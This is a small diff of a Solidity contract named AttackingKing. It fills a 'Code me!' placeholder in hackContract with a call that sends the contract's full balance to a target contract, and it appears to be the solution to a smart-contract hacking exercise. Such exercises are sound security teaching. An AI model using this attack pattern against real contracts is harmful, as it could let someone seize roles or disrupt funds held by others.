@@ -11,6 +11,6 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        address(contractAddress).call{value: address(this).balance}("");
     }
 }
